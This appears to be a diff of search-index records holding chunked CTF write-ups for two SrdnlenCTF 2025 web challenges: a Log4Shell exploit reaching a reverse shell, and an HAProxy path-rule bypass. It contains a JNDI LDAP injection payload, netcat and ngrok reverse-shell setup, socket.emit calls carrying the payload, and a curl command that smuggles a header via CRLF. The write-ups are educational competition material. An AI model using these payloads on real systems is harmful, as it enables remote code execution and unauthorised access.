@@ -6,6 +6,690 @@
         "categories": [
           "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
         ],
+        "content": "A detailed write-up of the Web challenge 'Sparkling Sky' from SrdnlenCTF - 2025",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": " Challenge Presentation ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:0:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event SrdnlenCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 500 Out of XXXX total \u2b50 Difficulty \ud83d\udfe1 Medium Personal Rating: 5/10 \ud83d\udc64 Author sanmatte Profile \ud83c\udfae Solves 49 XX% solve rate \ud83d\udcc5 Date 19-01-2025 SrdnlenCTF - 2025 Day X \ud83e\uddbe Solved By devgianlu Team: Team Aetruria ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:1:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "\ud83d\udcdd Challenge Information I am developing a game with websockets in python. I left my pc to a java fan, I think he really messed up. It is forbidden to perform or attempt to perform any action against the infrastructure or the challenge itself. username: user1337 password: user1337 website: http://sparklingsky.challs.srdnlen.it:8081 ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:2:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:3:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Provided Files Files: None \u00a0Attached Files \ud83d\udd0d Initial Analysis ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:3:1",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "First Steps Initially, the website appears as follows: Site Presentation By entering the login credentials specified in the challenge description, we are redirected to this page: Play From here, every time I clicked on play, nothing happened; only the access number in the queue changed. For this reason, I decided to read the attached files, and the first thing that caught my eye was the log4j.properties file. From there, I realized it was using Log4j, so I went to check the installed version in the Dockerfile: RUN cd $(python -c \"import os, pyspark; print(os.path.dirname(pyspark.__file__))\")/jars && \\ rm log4j* && \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar && \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar && \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-slf4j-impl/2.14.1/log4j-slf4j-impl-2.14.1.jar && \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-1.2-api/2.14.1/log4j-1.2-api-2.14.1.jar As we can see, the version is 2.14.1. Searching online, this version is vulnerable to CVE-2021-44228. Now we just need to figure out how to send the payload to exploit it. Continuing to read, I noticed in the anticheat.py file the use of spark and log4j, so I understood that the game\u2019s anticheat system needed to be triggered in some way to exploit the vulnerability: log4j_config_path = \"log4j.properties\" spark = SparkSession.builder \\ .appName(\"Anticheat\") \\ .config(\"spark.driver.extraJavaOptions\", \"-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:\" + log4j_config_path) \\ .config(\"spark.executor.extraJavaOptions\", \"-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:\" + log4j_config_path) \\ .getOrCreate() logger = spark._jvm.org.apache.log4j.LogManager.getLogger(\"Anticheat\") Continuing to read the files, I noticed that the browser and server also communicate via Socket.IO. However, if we examine the socket.py file, we see that there is no input validation. Even though our account is just a spectator, we can call any function. The handle_bird_movement function, although it uses the user ID, does not take it from cookies. It retrieves it from user-controlled input, so we can provide any ID we want, whether it belongs to a player or a spectator: def init_socket_events(socketio, players): @socketio.on('connect') @login_required def handle_connect(): user_id = int(current_user.get_id()) log_action(user_id, \"is connecting\") if user_id in players.keys(): # Player already exists, send their current position emit('connected', {'user_id': user_id, 'x': players[user_id]['x'], 'y': players[user_id]['y'], 'angle': players[user_id]['angle']}) else: # TODO: Check if the lobby is full and add the player to the queue log_action(user_id, f\"is spectating\") emit('update_bird_positions', players, broadcast=True) @socketio.on('move_bird') @login_required def handle_bird_movement(data): user_id = data.get('user_id') if user_id in players: del data['user_id'] if players[user_id] != data: with lock: players[user_id] = { 'x': data['x'], 'y': data['y'], 'color': 'black', 'angle': data.get('angle', 0) } if analyze_movement(user_id, data['x'], data['y'], data.get('angle', 0)): log_action(user_id, f\"was cheating with final position ({data['x']}, {data['y']}) and final angle: {data['angle']}\") # del players[user_id] # Remove the player from the game - we are in beta so idc emit('update_bird_positions', players, broadcast=True) @socketio.on('disconnect') @login_required def handle_disconnect(data): user_id = current_user.get_id() if user_id in players: del players[user_id] emit('update_bird_positions', players, broadcast=True) To trigger the anticheat, we still need to bypass the analyze_movement function. This function calculates whether our speed exceeds a certain threshold (the speed is calculated using other data like coordinates and timestamps). If it detects suspicious movement, it will log the attempt (inserting our payload into the logs). It also interpolates the angle property, which is never used in analyze_movement, so we can set it to whatever we want. Let\u2019s proceed with the exploit. ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:4:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "\ud83d\udd2c Vulnerability Analysis ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:5:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Potential Vulnerabilities Log4Shell \ud83c\udfaf Solution Path ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:5:1",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Exploitation Steps ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:6:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Initial setup The exploit essentially relies on sending a string like jndi:ldap://<ip>:1389/a to the server to have it written in the Log4j logs. Once this is done, we will receive a connection on our previously started server, obtaining a reverse shell. ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:6:1",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Exploitation First, I set up the port forwarding, as the poc.py file that exploits the vulnerability requires 3 port forwardings: ngrok tcp 1389 ngrok http 8080 ngrok tcp 9001 The first port is where the LDAP server will be hosted, the second is for the web server where the string we send will retrieve the java exploit created by the poc.py file, and finally, the last port is used to receive the reverse shell on netcat. So, we also open a netcat session: nc -lvnp 9001 And then, I start the exploit: python poc.py --userip ngrok_link --webport 8080 --lport 9001 Once that is done, all that\u2019s left is to send the string to the server to insert it into the logs. This can be done by writing a Python script with a socket connection to the server: python exploit.py Of course, in the exploit, every time it is run, the new ldap forwarding link created with ngrok must be set. This allowed me to obtain a reverse shell, and by running cat flag.txt, I was able to retrieve the flag. \ud83d\udee0\ufe0f Exploitation Process ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:6:2",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Approach I used the following exploit. I installed openjdk-11-jdk (which is also used in the challenge), then in poc.py I replaced all the relative paths to the JDK with the names of the binaries, which are now in the PATH. I ran python3 poc.py --userip <ip> --webport 8080 --lport 9001, which starts the LDAP server on port 1389 and the HTTP server on port 8080. Then, in another terminal, I started a netcat listener on port 9001 (nc -lvnp 9001). I performed the port forwarding for the 3 ports and ran exploit.py. Another way to do this was directly via the DevTools, as we have direct access to the socket variable in DevTools. We can interact directly with the socket. To activate the anticheat, we can send two movements with a short interval, using very different coordinates: socket.emit(\"move_bird\", {\"user_id\": 1, \"x\": 0, \"y\": 0, \"angle\": \"${jndi:ldap://<ip\\>:1389/a}\"}); setTimeout(() => { socket.emit(\"move_bird\", {\"user_id\": 1, \"x\": 142142352425524, \"y\": 4322525524, \"angle\": \"${jndi:ldap://<ip\\>:1389/a}\"}) }, 2000); \u00a0Exploit \u00a0POC \ud83d\udea9 Flag Capture Flag \ud83d\udd27 Tools Used Tool Purpose Python Exploit Ngrok Port Forwarding \ud83d\udcc8 Technical Deep Dive ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:7:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Vulnerability Details Type: RCE (CVE-2021-44228) CVSS Score: 10 ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:8:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Mitigation Strategies Update to the last version of log4j. \ud83d\udca1 Key Learnings ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:9:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "New Knowledge I learned how to exploit the Log4j vulnerability through the PoC. ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:10:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcda References & Resources ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:11:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Official Documentation Tool Docs Vulnerability Info ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:12:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Learning Resources https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/ https://systemoverlord.com/2022/06/20/bsidessf-2022-ctf-login4shell.html https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-logster/ https://www.youtube.com/watch?v=P8uOcQIE4Uk&ab_channel=2bitSec https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/ \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:44 From start to flag Global Ranking 26/1577 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 \u2022 Last Modified: 19-01-2025 Author: mH4ck3r0n3 \u2022 Team: Team Aetruria ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/sparkling-sky/:13:0",
+        "tags": [
+          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
+          "\ud83d\udcdc Log4j",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Sparkling Sky",
+        "uri": "/posts/2025/02/05/sparkling-sky/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "A detailed write-up of the Web challenge 'Average HTTP/3 Enjoyer' from SrdnlenCTF - 2025",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": " Challenge Presentation ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:0:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event SrdlenCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 405 Out of 500 total \u2b50 Difficulty \ud83d\udfe1 Medium Personal Rating: 3/10 \ud83d\udc64 Author pysu Profile \ud83c\udfae Solves 23 XX% solve rate \ud83d\udcc5 Date 19-01-2025 SrdlenCTF - 2025 Day X \ud83e\uddbe Solved By aquila2 Team: Team Aetruria ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:1:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "\ud83d\udcdd Challenge Information HTTP/3 is just the best version of HTTP, wait a few years, until setting up an HTTP/3 server will not be a pain, and you\u2019ll see. I hid a secret on /flag, you can only get it if you become a real HTTP/3 enjoyer. NOTE: This challenge uses only HTTP/3, browsers are a bit hesitant in using it by default, so you\u2019ll have to use explicit arguments to do so. In chrome you can do the following: chrome \u2013enable-quic \u2013origin-to-force-quic-on=enjoyer.challs.ctf.srdnlen.it ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:2:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:3:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Provided Files Files: \u00a0Attached Files \ud83d\udd0d Initial Analysis ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:3:1",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "First Steps After an initial analysis and some research, I tried making a request with curl using the --http3 option: curl --http3 https://enjoyer.challs.ctf.srdnlen.it Since the site was not reachable without HTTP/3 support, I proceeded to access the /flag route using curl: curl --http3 https://enjoyer.challs.ctf.srdnlen.it/flag Receiving a response with a 403 Unauthorized error: Forbidden Then I noticed that this was being blocked through the server\u2019s proxy rules: acl restricted_flag path_sub,url_dec -m sub -i i /flag http-request deny if restricted_flag Through an HAProxy proxy. So I started doing some research online to find an effective bypass for this proxy rule. ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:4:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "\ud83d\udd2c Vulnerability Analysis ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:5:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Potential Vulnerabilities 403 Bypass Proxy Rule Bypass \ud83c\udfaf Solution Path ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:5:1",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Exploitation Steps ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:6:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Initial setup After searching online, as mentioned earlier, I found the page on StackOvreflow, from which I figured out how to craft the exploit. The trick was to URL-encode the slash (/) in a special syntax, but I also tried using the --path-as-is option in curl, but it didn\u2019t work. After that, I needed to craft any header to bypass the rule. ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:6:1",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Exploitation With the following exploit, I was able to obtain the flag: echo \"\\n\"; curl --insecure -X \"$(echo -en 'GET %2fflag 1/\\r\\nX-Ignore-Injection:')\" https://enjoyer.challs.ctf.srdnlen.it --http3 ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:6:2",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Flag capture Manual Flag \ud83d\udee0\ufe0f Exploitation Process ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:6:3",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Approach I wasn\u2019t able to write the automatic exploit in Python due to issues with HTTP/3. I also tried using httpx, but it didn\u2019t work. I even attempted using bash script, but without success. \u00a0None \ud83d\udea9 Flag Capture Flag ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:7:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation \ud83d\udd27 Tools Used Tool Purpose Curl Http3 request \ud83d\udca1 Key Learnings ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:8:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
